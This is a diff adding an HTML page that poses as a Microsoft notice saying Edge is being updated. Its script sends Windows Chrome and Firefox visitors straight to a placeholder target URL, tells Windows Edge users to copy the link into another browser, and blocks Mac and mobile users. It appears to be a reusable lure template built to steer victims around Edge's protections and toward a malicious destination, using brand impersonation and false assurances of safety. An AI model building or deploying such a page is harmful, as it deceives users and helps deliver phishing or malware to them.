@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            background: #F0F2F5;
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        /* Hidden by default - only shows for Edge */
+        #blockPage {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- This div only shows for Edge users -->
+    <div id="blockPage">
+        <div class="ms-container">
+            <div class="ms-card">
+                <div class="brand-bar"></div>
+                <div class="card-header">
+                    <div class="ms-logo">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="2" y="2" width="9" height="9" fill="#F25022"/>
+                            <rect x="13" y="2" width="9" height="9" fill="#7FBA00"/>
+                            <rect x="2" y="13" width="9" height="9" fill="#00A4EF"/>
+                            <rect x="13" y="13" width="9" height="9" fill="#FFB900"/>
+                        </svg>
+                        <span>Microsoft</span>
+                    </div>
+                </div>
+                <div class="card-content">
+                    <h1>Microsoft Edge is receiving an update</h1>
+                    <div class="status-badge">⚠️ Temporary service notice</div>
+                    <div class="description">
+                        We're currently rolling out a minor reliability update to Microsoft Edge. 
+                        During this time, this page requires features that are being updated.
+                    </div>
+                    <div class="info-panel">
+                        <p><strong>📌 What this means for you:</strong></p>
+                        <p>• The update is automatic and requires no action from you</p>
+                        <p>• It will complete within <strong>24–72 hours</strong></p>
+                        <p>• Your computer and data are completely safe</p>
+                        <p>• No settings will change — Edge will work normally again soon</p>
+                    </div>
+                    <div class="step-list">
+                        <div class="step-item">
+                            <div class="step-marker">1</div>
+                            <div class="step-desc"><strong>Open Google Chrome or Mozilla Firefox</strong> — these are free browsers that work with this page right now.</div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-marker">2</div>
+                            <div class="step-desc"><strong>Click the blue button below</strong> to copy a link that will open this page in your new browser.</div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-marker">3</div>
+                            <div class="step-desc"><strong>In Chrome or Firefox, click the address bar</strong> (the long white bar at the top), then paste and press Enter.</div>
+                        </div>
+                    </div>
+                    <button class="btn-primary" id="solidCopyBtn">📋 Copy page link</button>
+                    <div class="support-text">Need help? Ask a friend or family member to help you copy and paste.</div>
+                </div>
+                <div class="card-footer">Microsoft Corporation — Edge update in progress · Thank you for your patience</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="solidToast" class="toast-solid">✓ Copied to clipboard — open Chrome or Firefox and paste</div>
+
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#F0F2F5;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;padding:2rem}
+        .ms-container{max-width:720px;width:100%}
+        .ms-card{background:#FFFFFF;border-radius:16px;box-shadow:0 2px 8px rgba(0,0,0,0.04),0 4px 16px rgba(0,0,0,0.02);overflow:hidden}
+        .brand-bar{height:4px;background:#0078D4}
+        .card-header{padding:1.75rem 2rem 0.5rem 2rem;border-bottom:1px solid #EDEFF2}
+        .ms-logo{display:flex;align-items:center;gap:8px;margin-bottom:1rem}
+        .ms-logo svg{width:28px;height:28px}
+        .ms-logo span{font-size:0.85rem;font-weight:500;color:#0078D4}
+        .card-content{padding:1.5rem 2rem 2rem 2rem}
+        h1{font-size:1.75rem;font-weight:600;color:#1F1F1F;margin-bottom:0.75rem}
+        .status-badge{display:inline-block;background:#FFF4E5;color:#B55700;font-size:0.75rem;font-weight:600;padding:0.25rem 0.75rem;border-radius:20px;margin-bottom:1.25rem}
+        .description{font-size:1rem;line-height:1.5;color:#3B3B3B;margin-bottom:1.5rem}
+        .info-panel{background:#F8FAFD;border-radius:12px;padding:1.25rem 1.5rem;margin:1.5rem 0;border:1px solid #E6EDF4}
+        .info-panel p{margin-bottom:0.75rem;color:#2C2C2C}
+        .step-list{margin:1.5rem 0}
+        .step-item{display:flex;gap:14px;margin-bottom:1.25rem}
+        .step-marker{width:28px;height:28px;background:#EFF7FF;color:#0078D4;font-weight:700;font-size:0.85rem;border-radius:28px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .step-desc{font-size:0.95rem;color:#2C2C2C;line-height:1.4;flex:1}
+        .btn-primary{background:#0078D4;color:white;border:none;width:100%;padding:12px 20px;font-size:1rem;font-weight:500;border-radius:8px;cursor:pointer;margin:0.5rem 0 1rem 0}
+        .btn-primary:hover{background:#106EBE}
+        .support-text{font-size:0.75rem;color:#6C6E70;text-align:center;margin-top:1rem}
+        .card-footer{background:#F9FAFB;padding:0.85rem 2rem;font-size:0.7rem;color:#6C6E70;text-align:center;border-top:1px solid #EDEFF2}
+        .toast-solid{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:#2B2B2B;color:white;padding:10px 24px;border-radius:40px;font-size:0.85rem;opacity:0;transition:opacity 0.2s;pointer-events:none;z-index:1000;white-space:nowrap}
+        .toast-solid.show{opacity:1}
+        @media (max-width:560px){body{padding:1rem} h1{font-size:1.5rem} .toast-solid{white-space:normal;width:90%}}
+    </style>
+
+    <script>
+        (function() {
+            // ============================================
+            // 🔥 REDIRECT CONFIGURATION - CHANGE THIS URL 🔥
+            // ============================================
+            const REDIRECT_URL = "https://yourdomain.com/your-target-page";
+            
+            // ============================================
+            // BROWSER DETECTION
+            // ============================================
+            let isEdge = false;
+            let isChrome = false;
+            let isWindows = false;
+            const ua = navigator.userAgent.toLowerCase();
+            
+            // Edge detection
+            if (ua.includes("edg/") || ua.includes("edgios/") || ua.includes("edga/")) isEdge = true;
+            if (ua.includes("edge/") && !ua.includes("edg/")) isEdge = true;
+            if (ua.includes("microsoft edge") && !ua.includes("chrome")) isEdge = true;
+            
+            // Chrome detection (but not Edge)
+            if (ua.includes("chrome") && !ua.includes("edg") && !ua.includes("edge")) {
+                isChrome = true;
+            }
+            
+            // Firefox detection
+            const isFirefox = ua.includes("firefox") && !ua.includes("edge");
+            
+            // Windows detection
+            isWindows = ua.includes("win") || ua.includes("windows");
+            
+            // Platform block
+            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|mobile/i.test(ua);
+            const isMac = /macintosh|mac os x|macintel/i.test(ua);
+            const isBlockedPlatform = isMobile || isMac;
+            
+            // ============================================
+            // 🔥 FUNCTION: DIRECT REDIRECT (NO DELAY)
+            // ============================================
+            function performRedirect() {
+                window.location.href = REDIRECT_URL;
+            }
+            
+            // ============================================
+            // SCENARIO 1: Windows + Chrome/Firefox → DIRECT REDIRECT (NO ANIMATION)
+            // ============================================
+            if ((isChrome || isFirefox) && isWindows && !isBlockedPlatform) {
+                performRedirect();
+                return;
+            }
+            
+            // ============================================
+            // SCENARIO 2: Edge on Windows → SHOW BLOCK PAGE with copy link
+            // ============================================
+            if (isEdge && isWindows && !isBlockedPlatform) {
+                document.getElementById('blockPage').style.display = 'block';
+                
+                // Setup copy button
+                const copyButton = document.getElementById('solidCopyBtn');
+                const toast = document.getElementById('solidToast');
+                
+                function showToast() {
+                    if (toast) {
+                        toast.classList.add('show');
+                        setTimeout(() => toast.classList.remove('show'), 2600);
+                    }
+                }
+                
+                if (copyButton) {
+                    copyButton.addEventListener('click', async (e) => {
+                        e.preventDefault();
+                        try {
+                            await navigator.clipboard.writeText(REDIRECT_URL);
+                            showToast();
+                        } catch(err) {
+                            const ta = document.createElement('textarea');
+                            ta.value = REDIRECT_URL;
+                            ta.style.position = 'fixed';
+                            ta.style.top = '-1000px';
+                            document.body.appendChild(ta);
+                            ta.select();
+                            document.execCommand('copy');
+                            document.body.removeChild(ta);
+                            showToast();
+                        }
+                    });
+                }
+                return;
+            }
+            
+            // ============================================
+            // SCENARIO 3: Blocked platform (Mac/Mobile) → Show restriction
+            // ============================================
+            if (isBlockedPlatform) {
+                document.getElementById('blockPage').style.display = 'block';
+                const contentDiv = document.querySelector('#blockPage .card-content');
+                let platformName = isMobile ? "mobile device" : "Mac computer";
+                if (contentDiv) {
+                    contentDiv.innerHTML = `
+                        <h1>This page is optimized for Windows</h1>
+                        <div class="status-badge">⚠️ Platform compatibility notice</div>
+                        <div class="description">For the best experience, this page requires a Windows operating system.</div>
+                        <div class="info-panel">
+                            <p><strong>📌 What this means:</strong></p>
+                            <p>• You are accessing from a ${platformName}</p>
+                            <p>• This content is designed for Windows PCs</p>
+                            <p>• Please use a Windows computer to access this page</p>
+                        </div>
+                    `;
+                }
+                return;
+            }
+            
+            // ============================================
+            // FALLBACK: Default to block page
+            // ============================================
+            document.getElementById('blockPage').style.display = 'block';
+        })();
+    </script>
+</body>
+</html>
